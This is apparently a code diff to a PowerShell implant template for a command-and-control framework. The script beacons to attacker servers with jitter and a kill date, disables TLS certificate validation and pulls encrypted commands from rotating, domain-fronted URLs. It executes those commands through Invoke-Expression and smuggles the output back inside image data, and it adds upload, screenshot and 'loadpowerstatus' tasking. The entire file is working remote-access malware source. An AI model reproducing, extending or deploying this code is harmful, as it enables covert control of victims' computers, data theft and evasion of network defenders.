@@ -1,18 +1,18 @@
 $key="%s"
 $jitter='%s'
 Function Beacon($sleeptime) {
-    if ($sleeptime.ToLower().Contains('m')) { 
+    if ($sleeptime.ToLower().Contains('m')) {
         $sleeptime = $sleeptime -replace 'm', ''
-        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $sleeptime
         [int]$newsleep = $newsleep * 60
     }
-    elseif ($sleeptime.ToLower().Contains('h')) { 
+    elseif ($sleeptime.ToLower().Contains('h')) {
         $sleeptime = $sleeptime -replace 'h', ''
-        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep1 = $sleeptime
         [int]$newsleep2 = $newsleep1 * 60
         [int]$newsleep = $newsleep2 * 60
     }
-    elseif ($sleeptime.ToLower().Contains('s')) { 
+    elseif ($sleeptime.ToLower().Contains('s')) {
         $newsleep = $sleeptime -replace 's', ''
     } else {
         $newsleep = $sleeptime
@@ -25,17 +25,23 @@ Beacon('%s')
 
 $payloadclear = @"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
-`$s="$s"
-`$sc="$sc"
+`$df=@("$df")
+`$h=""
+`$sc=""
+`$urls=@("$urls")
+`$curl="$curl"
+`$s=`$urls[0]
 function DEC {${function:DEC}}
 function ENC {${function:ENC}}
 function CAM {${function:CAM}}
 function Get-Webclient {${function:Get-Webclient}}
-function Primer {${function:primer}}
-`$primer = primer
-if (`$primer) {`$primer| iex} else {
-start-sleep 1800
-primer | iex }
+function primern {${function:primern}}
+function primers {${function:primers}}
+primers
+Start-Sleep 300
+primers
+Start-Sleep 600
+primers
 "@
 
 $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
@@ -54,7 +60,7 @@ $payload = $payloadraw -replace "`n", ""
 
 function GetImgData($cmdoutput) {
     $icoimage = @(%s)
-    
+
     try {$image = $icoimage|get-random}catch{}
 
     function randomgen
@@ -117,6 +123,7 @@ function Encrypt-String($key, $unencryptedString) {
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
     [System.Convert]::ToBase64String($fullData)
 }
+
 function Encrypt-Bytes($key, $bytes) {
     [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
     $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
@@ -183,24 +190,40 @@ function Send-Response($Server, $Key, $TaskId, $Data) {
       }
     }
   }
-  
-function Send-ResponseAsync($Server, $Key, $TaskId, $Data) 
+
+function Send-ResponseAsync($Server, $Key, $TaskId, $Data)
 {
   try
   {
       $eid = Encrypt-String $Key $TaskId
       $Output = Encrypt-String2 $Key $Data
-      $UploadBytes = getimgdata $Output    
+      $UploadBytes = getimgdata $Output
       $wc=(Get-Webclient -Cookie $eid)
       #$Job = Register-ObjectEvent -InputObject $wc -EventName "UploadDataCompleted" -Action {}
       $wc.UploadDataAsync("$Server", $UploadBytes)|out-null
-  } 
-  catch 
+  }
+  catch
   {
     Write-Output "ErrorResponse: " + $error[0]
     Write-Output(Resolve-Error)
   }
 }
+
+function GenerateURL
+{
+    $RandomURI = Get-Random $URLS
+    $num = Get-Random -Minimum 0 -Maximum ($ServerURLS.Count)
+    $ServerClean = $ServerURLS[$num]
+    if (!$rotdf){
+        #dfset
+    } else {
+        $script:h = $rotdf[$num]
+    }
+    $G=[guid]::NewGuid()
+    $Server = "$ServerClean/$RandomURI$G/?$URI"
+    return $Server
+}
+
 function Resolve-Error ($ErrorRecord=$Error[0])
 {
    $ErrorRecord | Format-List * -Force
@@ -211,32 +234,33 @@ function Resolve-Error ($ErrorRecord=$Error[0])
        $Exception |Format-List * -Force
    }
 }
+
 $URI= "%s"
 $Server = "$s/%s"
 $ServerClean = "$sc"
+$rotate = ""
+
 while($true)
 {
-    $ServerURLS = "$($ServerClean)","$($ServerClean)"
-    $date = (Get-Date -Format "dd/MM/yyyy")
-    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
-    $killdate = [datetime]::ParseExact("%s","dd/MM/yyyy",$null)
+    if (!$rotate){
+        $ServerURLS = "$($ServerClean)","$($ServerClean)"
+    } else {
+        $ServerURLS = $rotate
+    }
+    $date = (Get-Date -Format "yyyy-MM-dd")
+    $date = [datetime]::ParseExact($date,"yyyy-MM-dd",$null)
+    $killdate = [datetime]::ParseExact("%s","yyyy-MM-dd",$null)
     if ($killdate -lt $date) {exit}
     $sleeptimeran = ([int]$sleeptime * (1 + $Jitter))..([int]$sleeptime * (1 - $Jitter))
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5}
     start-sleep $newsleep
     $URLS = %s
-    $RandomURI = Get-Random $URLS
-    $ServerClean = Get-Random $ServerURLS
-    $G=[guid]::NewGuid()
-    $Server = "$ServerClean/$RandomURI$G/?$URI"
+    $Server = GenerateURL
     try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
-    
+
     while($ReadCommand) {
-        $RandomURI = Get-Random $URLS
-        $ServerClean = Get-Random $ServerURLS
-        $G=[guid]::NewGuid()
-        $Server = "$ServerClean/$RandomURI$G/?$URI"
+        $Server = GenerateURL
         try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
         $error.clear()
         try {
@@ -248,10 +272,7 @@ while($true)
                           $id = New-Object System.String($i, 0, 5)
                           $c = New-Object System.String($i, 5, ($i.Length - 5))
                           $i = $c
-                          $RandomURI = Get-Random $URLS
-                          $ServerClean = Get-Random $ServerURLS
-                          $G=[guid]::NewGuid()
-                          $Server = "$ServerClean/$RandomURI$G/?$URI"
+                          $Server = GenerateURL
                           $error.clear()
                           if ($i.ToLower().StartsWith("upload-file")) {
                               try {
@@ -307,7 +328,17 @@ while($true)
                                   $Output = "ErrorScreenshotMulti: " + $error[0]
                                   Send-Response $Server $key $id $Output
                               }
-                          } else {
+                          } elseif ($i.ToLower().StartsWith("loadpowerstatus")) {
+                              try {
+                                  $i = $i + " -taskid " + $id
+                                  Invoke-Expression $i | Out-Null
+                              }
+                              catch {
+                                  $Output = "Error - loadpowerstatus: " + $error[0]
+                                  Send-Response $Server $key $id $Output
+                              }
+                            }
+                            else {
                               try {
                                   $Output = Invoke-Expression $i | out-string
                                   $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -323,7 +354,7 @@ while($true)
                           }
                       }
               }
-            
+
             $ReadCommandClear = $null
             $ReadCommand = $null
           }
